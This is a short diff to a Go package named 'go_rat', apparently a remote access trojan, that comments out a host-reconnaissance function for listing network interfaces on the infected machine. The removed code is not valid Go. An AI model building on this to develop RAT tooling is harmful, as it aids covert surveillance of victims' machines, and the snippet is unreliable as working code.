@@ -8,7 +8,6 @@ package go_rat
 
 // import the libraries we need
 import (
-	"net"
 	"strconv"
 
 	// necessary for gathering process information
@@ -19,12 +18,13 @@ import (
 Function to gather information about the host
 the rat is in residence on
 */
-func gather_intel(intel_struct HostIntel) (HostIntel, error) {
-	// Get all network interfaces
-	interfaces, _ := net.Interfaces()
-	HostIntel.interfaces = interfaces
-	return _, nil
-}
+//func gather_intel(intel_struct HostIntel) (HostIntel, error) {
+// Get all network interfaces
+//interfaces, _ := net.Interfaces()
+//HostIntel.interfaces = interfaces
+//return _, nil
+
+//}
 
 // Procs returns a slice of process objects
 // Look at "PrintProcSummary()" and "PrintProcDetails()" for examples on displaying the process info
